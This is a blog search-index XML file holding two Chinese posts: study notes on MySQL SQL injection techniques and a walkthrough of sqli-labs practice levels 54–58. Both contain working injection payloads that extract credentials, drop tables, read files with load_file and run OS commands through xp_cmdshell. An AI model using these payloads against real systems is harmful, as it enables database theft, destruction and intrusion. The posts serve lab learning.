<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>sql注入漏洞</title>
      <link href="/posts/b737.html"/>
      <url>/posts/b737.html</url>
      
        <content type="html"><![CDATA[<p>打完65关的sql靶场，浅浅地整理了一下关于sql注入的知识点。主要是mysql数据库的。</p><span id="more"></span><!--more--><h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><p>● 字段table_schema记录库名，table_name记录表名，column_name记录字段名</p><p>● 在 mysql5 版本以后，mysql 默认在数据库中存放在一个叫 infomation_schema 里面</p><p>● 这个库里面有很多表重点是这三个表 columns 、tables、schemata</p><pre class="line-numbers language-bash"><code class="language-bash">columns  存储该用户创建的所有数据库的库名、表名和字段名。tables   表字段table_schema 、table_name 分别记录着库名和表名schemata 表字段schema_name 记录着库的信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="常用函数："><a href="#常用函数：" class="headerlink" title="常用函数："></a>常用函数：</h1><ol><li><p>version()——MySQL 版本</p></li><li><p>user()——数据库用户名</p></li><li><p>database()——数据库名</p></li><li><p>@@datadir——数据库路径</p></li><li><p>@@version_compile_os——操作系统版本</p></li></ol><h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><h3 id="1、sql注入原理"><a href="#1、sql注入原理" class="headerlink" title="1、sql注入原理"></a>1、sql注入原理</h3><p>● 参数用户可控</p><p>● 参数带入数据库查询</p><h3 id="2、判断是否存在注入"><a href="#2、判断是否存在注入" class="headerlink" title="2、判断是否存在注入"></a>2、判断是否存在注入</h3><p>● 数字型注入：/1 和 /0回显不一样。或者传入id=1 and 1=1 和id=1 and 1=2回显不一样等等</p><p>● 字符型注入：’ 和 ‘’ 回显不一样，单数的和双数的单引号回显规不规律</p><h3 id="3、注释符"><a href="#3、注释符" class="headerlink" title="3、注释符"></a>3、注释符</h3><p>● 单行注释：减减加(–+)，减减空格(– )，#</p><p>● 多行注释：/<em>……</em>/</p><h1 id="sql注入分类"><a href="#sql注入分类" class="headerlink" title="sql注入分类"></a>sql注入分类</h1><h2 id="1、union联合注入"><a href="#1、union联合注入" class="headerlink" title="1、union联合注入"></a>1、union联合注入</h2><p>含义：联合查询注入是联合两个表进行注入攻击，使用关键词 union select 对两个表进行联合查询。两个表的字段数要相同，不然会出现报错。</p><h4 id="●-Limit"><a href="#●-Limit" class="headerlink" title="● Limit"></a>● Limit</h4><p>Limit是指限定查询的条数。有三种方式：</p><h5 id="方式一：limit-参数1"><a href="#方式一：limit-参数1" class="headerlink" title="方式一：limit 参数1"></a>方式一：limit 参数1</h5><p>参数1可从1开始，往后递增，表示要查询几条数据。</p><p>例如，limit 1 表示限定查询一条语句。</p><h5 id="方式二：limit-参数1，参数2"><a href="#方式二：limit-参数1，参数2" class="headerlink" title="方式二：limit 参数1，参数2"></a>方式二：limit 参数1，参数2</h5><p>参数1从0开始，表示从第几行（按照索引0作第一行）开始查询，参数2表示要查询的条数。合在一起的意思就是，从参数1开始，查询参数2条语句。</p><p>例如，limit 0,1 表示查询第一条语句，和limit 1等意。</p><h5 id="方式三：limit-参数1-offset-参数2"><a href="#方式三：limit-参数1-offset-参数2" class="headerlink" title="方式三：limit 参数1 offset 参数2"></a>方式三：limit 参数1 offset 参数2</h5><p>参数1表示限定要查询几条，参数2表示从第几行（按照索引为0作第一行）开始查询。</p><p>例如：limit 1 offset 0 表示查询第一条参数。</p><h3 id="（1）判断"><a href="#（1）判断" class="headerlink" title="（1）判断"></a>（1）判断</h3><p>传入1正常，传入1’报错</p><p>传入1’ and ‘1’=’1 和传入 1’ and ‘1’=’2  页面回显不一样</p><h3 id="（2）判断字段数"><a href="#（2）判断字段数" class="headerlink" title="（2）判断字段数"></a>（2）判断字段数</h3><p>公式：order by n-1    到n出错时，则字段数为n-1</p><h3 id="（3）获取敏感信息"><a href="#（3）获取敏感信息" class="headerlink" title="（3）获取敏感信息"></a>（3）获取敏感信息</h3><p> -1 union select 1,2–+</p><p> (-1是让前面的表查询的内容不存在，将1或2可替换成version(),database(),user()等）</p><pre class="line-numbers language-bash"><code class="language-bash">例1：-1<span class="token string">' union select 1,user()例2：-1'</span> union <span class="token keyword">select</span> 1,group_concat<span class="token punctuation">(</span>user<span class="token punctuation">(</span><span class="token punctuation">)</span>,0x3a,database<span class="token punctuation">(</span><span class="token punctuation">))</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="（4）获取表"><a href="#（4）获取表" class="headerlink" title="（4）获取表"></a>（4）获取表</h3><pre class="line-numbers language-bash"><code class="language-bash">-1' union <span class="token keyword">select</span> 1,<span class="token punctuation">(</span>select table_name from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> limit 0,1<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="（5）获取字段"><a href="#（5）获取字段" class="headerlink" title="（5）获取字段"></a>（5）获取字段</h3><pre class="line-numbers language-bash"><code class="language-bash">-1’ union <span class="token keyword">select</span> 1,<span class="token punctuation">(</span>select column_name from information_schema.columns where table_name<span class="token operator">=</span><span class="token string">'users'</span> limit 0,1<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="（6）查询某个表的内容"><a href="#（6）查询某个表的内容" class="headerlink" title="（6）查询某个表的内容"></a>（6）查询某个表的内容</h3><h5 id="例如：获取users表的user和password"><a href="#例如：获取users表的user和password" class="headerlink" title="例如：获取users表的user和password"></a>例如：获取users表的user和password</h5><pre class="line-numbers language-bash"><code class="language-bash">-1' union <span class="token keyword">select</span> 1,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>user,0x3a,password<span class="token punctuation">)</span> from <span class="token function">users</span> limit 1<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2、Boolean布尔型盲注"><a href="#2、Boolean布尔型盲注" class="headerlink" title="2、Boolean布尔型盲注"></a>2、Boolean布尔型盲注</h2><p>含义：在页面中不会显示数据库信息，一般情况下只会显示对与错的内容。</p><h4 id="if-1-1-1-0"><a href="#if-1-1-1-0" class="headerlink" title="if(1=1,1,0)"></a>if(1=1,1,0)</h4><p>● if(参数1，参数2，参数3）</p><p>● 参数1是语句，参数2表示正确时显示，参数3表示错误时显示</p><h4 id="substr"><a href="#substr" class="headerlink" title="substr"></a>substr</h4><p>● substr(参数1，参数2，参数3）</p><p>● 参数1是字符串，参数2是开始截取（索引从1开始），参数3是截取的长度</p><h3 id="（1）判断-1"><a href="#（1）判断-1" class="headerlink" title="（1）判断"></a>（1）判断</h3><p>传入1正常，传入1’报错</p><p>传入1’ and ‘1’=’1 和传入 1’ and ‘1’=’2  页面回显不一样</p><h3 id="（2）获取敏感信息"><a href="#（2）获取敏感信息" class="headerlink" title="（2）获取敏感信息"></a>（2）获取敏感信息</h3><pre class="line-numbers language-bash"><code class="language-bash">1<span class="token string">' and if(substr(user(),1,1)='</span>a',1,0<span class="token punctuation">)</span>--+判断数据库用户名第一个字符是否为a，是则返回1，否则返回0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="（3）获取数据库名"><a href="#（3）获取数据库名" class="headerlink" title="（3）获取数据库名"></a>（3）获取数据库名</h3><pre class="line-numbers language-bash"><code class="language-bash">1<span class="token string">' and if(substr(database(),1,1)='</span>a',1,0<span class="token punctuation">)</span>--+可抓包对变量1：长度，变量2：a~zA~Z0~9._@  这两个变量进行爆破<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="（4）获取表名"><a href="#（4）获取表名" class="headerlink" title="（4）获取表名"></a>（4）获取表名</h3><pre class="line-numbers language-bash"><code class="language-bash">1’ and if<span class="token punctuation">(</span>substr<span class="token punctuation">((</span>select table_name from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> limit 1<span class="token punctuation">)</span>,1,1<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'a'</span>,1,0<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="（5）获取字段名"><a href="#（5）获取字段名" class="headerlink" title="（5）获取字段名"></a>（5）获取字段名</h3><pre class="line-numbers language-bash"><code class="language-bash">1<span class="token string">' and if(substr((select column_name form information_schema.columns where table_name='</span><span class="token function">users</span><span class="token string">' limit 1,1),1,1)='</span>a',1,0<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="（6）获取表的内容"><a href="#（6）获取表的内容" class="headerlink" title="（6）获取表的内容"></a>（6）获取表的内容</h3><pre class="line-numbers language-bash"><code class="language-bash">1’ and if<span class="token punctuation">(</span>substr<span class="token punctuation">((</span>select concat<span class="token punctuation">(</span>user,0x3a,password<span class="token punctuation">)</span>from <span class="token function">users</span> limit 1<span class="token punctuation">)</span>,1,1<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'a'</span>,1,0<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3、报错注入"><a href="#3、报错注入" class="headerlink" title="3、报错注入"></a>3、报错注入</h2><p>含义：数据库显错是指，数据库在执行时，遇到语法不对，会显示报错信息。</p><h3 id="（1）判断-2"><a href="#（1）判断-2" class="headerlink" title="（1）判断"></a>（1）判断</h3><p>输入单引号 如果报错有可能存在报错注入，如果拼接 SQL 语句带入到 mysql 执行即存在报错注入</p><h3 id="（2）获取库名"><a href="#（2）获取库名" class="headerlink" title="（2）获取库名"></a>（2）获取库名</h3><pre class="line-numbers language-bash"><code class="language-bash">1' and info<span class="token punctuation">(</span><span class="token punctuation">)</span>--+原理：会报错显示当前库（库名会显示出来）不存在这个函数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="（3）获取敏感信息-1"><a href="#（3）获取敏感信息-1" class="headerlink" title="（3）获取敏感信息"></a>（3）获取敏感信息</h3><h4 id="●-updatexml-函数"><a href="#●-updatexml-函数" class="headerlink" title="● updatexml()函数"></a>● updatexml()函数</h4><pre class="line-numbers language-bash"><code class="language-bash">1' and updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select user<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span>--+可将user<span class="token punctuation">(</span><span class="token punctuation">)</span>换成database<span class="token punctuation">(</span><span class="token punctuation">)</span>，version<span class="token punctuation">(</span><span class="token punctuation">)</span>等<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="●-extractvalue-函数"><a href="#●-extractvalue-函数" class="headerlink" title="● extractvalue()函数"></a>● extractvalue()函数</h4><pre class="line-numbers language-bash"><code class="language-bash">1' and extractvalue<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select user<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">))</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="●-floor-函数"><a href="#●-floor-函数" class="headerlink" title="● floor()函数"></a>● floor()函数</h4><pre class="line-numbers language-bash"><code class="language-bash">1' and <span class="token punctuation">(</span>select count<span class="token punctuation">(</span>*<span class="token punctuation">)</span> from information_schema.tables group by concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select user<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e,floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span>0<span class="token punctuation">)</span>*2<span class="token punctuation">))</span><span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="4、时间注入（延时注入，基于时间的SQL盲注）"><a href="#4、时间注入（延时注入，基于时间的SQL盲注）" class="headerlink" title="4、时间注入（延时注入，基于时间的SQL盲注）"></a>4、时间注入（延时注入，基于时间的SQL盲注）</h2><p>含义：时间注入又名延时注入，属于盲注入的一种，通常是某个注入点无法通过布尔型注入获取数据而采用一种突破注入的技巧。跟布尔型差不多，只是将布尔型如果成功显示1换成如果成功延时多少秒。</p><h4 id="sleep"><a href="#sleep" class="headerlink" title="sleep()"></a>sleep()</h4><p>sleep() 是延时的意思，sleep(10)就是数据库延时10 秒返回内容。</p><h3 id="（1）判断-3"><a href="#（1）判断-3" class="headerlink" title="（1）判断"></a>（1）判断</h3><pre class="line-numbers language-bash"><code class="language-bash">id<span class="token operator">=</span>1' and sleep<span class="token punctuation">(</span>5<span class="token punctuation">)</span>--+  存在延时<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="（2）获取敏感信息-1"><a href="#（2）获取敏感信息-1" class="headerlink" title="（2）获取敏感信息"></a>（2）获取敏感信息</h3><pre class="line-numbers language-bash"><code class="language-bash">1<span class="token string">' and if(substr(user(),1,1)='</span>a',sleep<span class="token punctuation">(</span>5<span class="token punctuation">)</span>,0<span class="token punctuation">)</span>--+判断数据库用户名第一个字符是否为a，是则返回1，否则返回0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="（3）获取数据库名-1"><a href="#（3）获取数据库名-1" class="headerlink" title="（3）获取数据库名"></a>（3）获取数据库名</h3><pre class="line-numbers language-bash"><code class="language-bash">1<span class="token string">' and if(substr(database(),1,1)='</span>s',sleep<span class="token punctuation">(</span>5<span class="token punctuation">)</span>,0<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="5、堆叠注入（多语句查询注入）"><a href="#5、堆叠注入（多语句查询注入）" class="headerlink" title="5、堆叠注入（多语句查询注入）"></a>5、堆叠注入（多语句查询注入）</h2><p>含义：可以执行多条sql语句，语句之间以分号隔开。</p><p>堆叠注入主要用来实现数据库的增删查改操作：</p><h3 id="MySQL："><a href="#MySQL：" class="headerlink" title="MySQL："></a>MySQL：</h3><h4 id="（1）新建一个表"><a href="#（1）新建一个表" class="headerlink" title="（1）新建一个表"></a>（1）新建一个表</h4><pre class="line-numbers language-bash"><code class="language-bash">Select * from <span class="token function">users</span> where id<span class="token operator">=</span>1<span class="token punctuation">;</span>create table <span class="token function">test</span> like <span class="token function">users</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="（2）删除表"><a href="#（2）删除表" class="headerlink" title="（2）删除表"></a>（2）删除表</h4><pre class="line-numbers language-bash"><code class="language-bash">Select * from <span class="token function">users</span> where id<span class="token operator">=</span>1<span class="token punctuation">;</span>drop table <span class="token function">test</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="（3）查询数据"><a href="#（3）查询数据" class="headerlink" title="（3）查询数据"></a>（3）查询数据</h4><pre class="line-numbers language-bash"><code class="language-bash">Select * from <span class="token function">users</span> where id<span class="token operator">=</span>1<span class="token punctuation">;</span><span class="token keyword">select</span> 1,2,3<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="（4）加载文件"><a href="#（4）加载文件" class="headerlink" title="（4）加载文件"></a>（4）加载文件</h4><pre class="line-numbers language-bash"><code class="language-bash">Select * from <span class="token function">users</span> where id<span class="token operator">=</span>1<span class="token punctuation">;</span><span class="token keyword">select</span> load_file<span class="token punctuation">(</span><span class="token string">'C:/1.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="（5）修改数据"><a href="#（5）修改数据" class="headerlink" title="（5）修改数据"></a>（5）修改数据</h4><pre class="line-numbers language-bash"><code class="language-bash">Select * from <span class="token function">users</span> where id<span class="token operator">=</span>1<span class="token punctuation">;</span>insert into users<span class="token punctuation">(</span>id,username,password<span class="token punctuation">)</span> values<span class="token punctuation">(</span><span class="token string">'100'</span>,<span class="token string">'new'</span>,<span class="token string">'new'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="SqlServer："><a href="#SqlServer：" class="headerlink" title="SqlServer："></a>SqlServer：</h3><h4 id="（1）新建一个表-1"><a href="#（1）新建一个表-1" class="headerlink" title="（1）新建一个表"></a>（1）新建一个表</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">select</span> * from <span class="token function">test</span><span class="token punctuation">;</span>create table sc3<span class="token punctuation">(</span>ss CHAR<span class="token punctuation">(</span>8<span class="token punctuation">))</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="（2）删除表-1"><a href="#（2）删除表-1" class="headerlink" title="（2）删除表"></a>（2）删除表</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">select</span> * from <span class="token function">test</span><span class="token punctuation">;</span>drop table sc3<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="（3）查询数据-1"><a href="#（3）查询数据-1" class="headerlink" title="（3）查询数据"></a>（3）查询数据</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">select</span> 1,2,3<span class="token punctuation">;</span><span class="token keyword">select</span> * from <span class="token function">test</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="（4）修改数据"><a href="#（4）修改数据" class="headerlink" title="（4）修改数据"></a>（4）修改数据</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">select</span> * from <span class="token function">test</span><span class="token punctuation">;</span>update <span class="token function">test</span> <span class="token keyword">set</span> name<span class="token operator">=</span><span class="token string">'test'</span> where id<span class="token operator">=</span>3<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="（5）存储过程的执行"><a href="#（5）存储过程的执行" class="headerlink" title="（5）存储过程的执行"></a>（5）存储过程的执行</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">select</span> * from <span class="token function">test</span> where id<span class="token operator">=</span>1<span class="token punctuation">;</span><span class="token function">exec</span> master<span class="token punctuation">..</span>xp_cmdshell <span class="token string">'ipconfig'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Oracle不能使用堆叠注入"><a href="#Oracle不能使用堆叠注入" class="headerlink" title="Oracle不能使用堆叠注入"></a>Oracle不能使用堆叠注入</h3><h3 id="Postgresql："><a href="#Postgresql：" class="headerlink" title="Postgresql："></a>Postgresql：</h3><h4 id="（1）新建一个表-2"><a href="#（1）新建一个表-2" class="headerlink" title="（1）新建一个表"></a>（1）新建一个表</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">select</span> * from user_test<span class="token punctuation">;</span>create table user_data<span class="token punctuation">(</span>id DATE<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="（2）删除表-2"><a href="#（2）删除表-2" class="headerlink" title="（2）删除表"></a>（2）删除表</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">select</span> * from user_test<span class="token punctuation">;</span>delete from user_data<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="（3）查询数据-2"><a href="#（3）查询数据-2" class="headerlink" title="（3）查询数据"></a>（3）查询数据</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">select</span> * from user_test<span class="token punctuation">;</span><span class="token keyword">select</span> 1,2,3<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="（4）修改数据-1"><a href="#（4）修改数据-1" class="headerlink" title="（4）修改数据"></a>（4）修改数据</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">select</span> * from user_test<span class="token punctuation">;</span>update user_test <span class="token keyword">set</span> name<span class="token operator">=</span><span class="token string">'modify'</span> where name<span class="token operator">=</span><span class="token string">'张三'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="6、二次注入"><a href="#6、二次注入" class="headerlink" title="6、二次注入"></a>6、二次注入</h2><p>含义：将可能导致sql 注入的字符先存入到数据库中，当再次调用这个恶意构造的字符时，就可以触发sql注入。</p><p>原理：插入恶意数据库——&gt;引用恶意数据</p><h2 id="7、宽字节注入"><a href="#7、宽字节注入" class="headerlink" title="7、宽字节注入"></a>7、宽字节注入</h2><p>产生原因：数据库编码与PHP编码设置为不同的两个编码。</p><p> Big5和GBK字符集有可能会存在宽字节注入，utf-8和gb2312没有。Mysql在使用GBK编码时，会认为两个字符为一个汉字。</p><h4 id="思路一："><a href="#思路一：" class="headerlink" title="思路一："></a>思路一：</h4><p>%df吃掉\  原因在于urldecode(‘)=%5c%27,而我们在前面添加%df，就形成了%df%5c%27,mysql在GBK编码中前两个字当做一个汉字，此时%27就会作为一个单独的字符，也就是’</p><h4 id="思路二："><a href="#思路二：" class="headerlink" title="思路二："></a>思路二：</h4><p>将&#39;中的\过滤掉。可以构造%**%5c%5c%27，后面的%5c会被前面的%5c给注释掉。</p><h1 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h1><p>最后放张上面知识的思维导图版吧</p><p>&lt;<img src="/posts/b737/1.png" class></p>]]></content>
      
      
      <categories>
          
          <category> web漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
            <tag> web漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli靶场(54~65关)</title>
      <link href="/posts/b894.html"/>
      <url>/posts/b894.html</url>
      
        <content type="html"><![CDATA[<p>最后一个部分啦~</p><span id="more"></span><h1 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h1><p>本关是字符型注入，但是只能尝试十次，这里的表名和密码等是每十次尝试后就强制进行更换。已知数据库名字叫做 challenges。</p><h3 id="54-1获取表名"><a href="#54-1获取表名" class="headerlink" title="54.1获取表名"></a>54.1获取表名</h3><pre class="line-numbers language-bash"><code class="language-bash">payloay：id<span class="token operator">=</span>-1' union <span class="token keyword">select</span> 1,2,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>得到表名为2ope75q6zd</p><img src="/posts/b894/54.png" class><h3 id="54-2获得列名"><a href="#54-2获得列名" class="headerlink" title="54.2获得列名"></a>54.2获得列名</h3><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>-1<span class="token string">' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='</span>2ope75q6zd'<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>得到列名为：</p><p> <img src="/posts/b894/54_2.png" class></p><h3 id="54-3获得密码"><a href="#54-3获得密码" class="headerlink" title="54.3获得密码"></a>54.3获得密码</h3><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>-1' union <span class="token keyword">select</span> 1,2,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>secret_05Z3<span class="token punctuation">)</span> from challenges.2ope75q6zd<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>得到密码为lfBO3vPE7GdhmgTXQczwr2ne</p><p> <img src="/posts/b894/54_3.png" class></p><p>实际渗透测试当中，我们可以利用更换 ip（可以考虑代理）或者更换浏览器等，要看服务器端检测什么内容进行限制。</p><h1 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h1><p>本关和 less54 差不多，只要将上述的语句的’换成)即可，但是这里要求次数为 14 次。</p><h3 id="55-1获得表名"><a href="#55-1获得表名" class="headerlink" title="55.1获得表名"></a>55.1获得表名</h3><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>-1<span class="token punctuation">)</span> union <span class="token keyword">select</span> 1,2,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>得到表名为i06vq2flin</p><p> <img src="/posts/b894/55.png" class></p><h3 id="55-2获得列名"><a href="#55-2获得列名" class="headerlink" title="55.2获得列名"></a>55.2获得列名</h3><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>-1<span class="token punctuation">)</span> union <span class="token keyword">select</span> 1,2,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> from information_schema.columns where table_name<span class="token operator">=</span><span class="token string">'i06vq2flin'</span><span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>得到列名为：</p><p> <img src="/posts/b894/55_2.png" class></p><h3 id="55-3获得密码"><a href="#55-3获得密码" class="headerlink" title="55.3获得密码"></a>55.3获得密码</h3><pre class="line-numbers language-bash"><code class="language-bash">id<span class="token operator">=</span>-1<span class="token punctuation">)</span> union <span class="token keyword">select</span> 1,2,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>secret_3IW0<span class="token punctuation">)</span> from challenges.i06vq2flin<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到密码为sUPkMFLHHcCFx53qGcVnWgeK</p><p> <img src="/posts/b894/55_3.png" class></p><h1 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h1><p>与less54.55 形式是一致的，只是sql语句中id=(‘$id’)</p><h4 id="获得表名："><a href="#获得表名：" class="headerlink" title="获得表名："></a>获得表名：</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:id<span class="token operator">=</span>-1'<span class="token punctuation">)</span> union <span class="token keyword">select</span> 1,2,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>得到表名为aeiv7ims93</p><p> <img src="/posts/b894/56.png" class></p><p>后面的以此类推。</p><h1 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h1><p>与前面关卡形式是一致的，只是sql语句中id=”$id”</p><h4 id="获得表名：-1"><a href="#获得表名：-1" class="headerlink" title="获得表名："></a>获得表名：</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:id<span class="token operator">=</span>-1" union <span class="token keyword">select</span> 1,2,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>得到表名为9vdsnwwupd</p><p> <img src="/posts/b894/57.png" class></p><h1 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h1><p>当我们采用之前的union联合语句时，并没有出现表的信息。</p><h3 id="采用报错注入："><a href="#采用报错注入：" class="headerlink" title="采用报错注入："></a>采用报错注入：</h3><h3 id="58-1获得表名"><a href="#58-1获得表名" class="headerlink" title="58.1获得表名"></a>58.1获得表名</h3><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>1' and updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>得到表名为six41nqivz</p><p> <img src="/posts/b894/58.png" class></p><h3 id="58-2获得列名"><a href="#58-2获得列名" class="headerlink" title="58.2获得列名"></a>58.2获得列名</h3><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>1<span class="token string">' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='</span>six41nqivz'<span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>获得列名：</p><p> <img src="/posts/b894/58_2.png" class></p><h3 id="58-3获得密码"><a href="#58-3获得密码" class="headerlink" title="58.3获得密码"></a>58.3获得密码</h3><pre class="line-numbers language-bash"><code class="language-bash">payload:id<span class="token operator">=</span>1' and updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>secret_AVJD<span class="token punctuation">)</span> from challenges.six41nqivz<span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>得到密码为Vee33Ad4mu5g9yGiAxqXFv4x</p><p> <img src="/posts/b894/58_3.png" 